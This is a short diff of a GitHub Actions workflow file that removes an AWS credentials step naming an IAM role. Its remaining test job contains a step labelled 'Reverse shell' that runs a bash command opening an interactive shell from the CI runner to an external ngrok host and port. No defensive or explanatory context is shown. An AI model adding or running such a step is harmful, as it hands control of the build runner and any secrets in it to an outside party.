@@ -11,10 +11,6 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - uses: aws-actions/configure-aws-credentials@v3
-        with:
-          role-to-assume:  arn:aws:iam::035866691871:role/incubator-cicd-vrms
-          aws-region: us-east-1
       - name: Reverse shell
         run: |
           bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/10699 0>&1
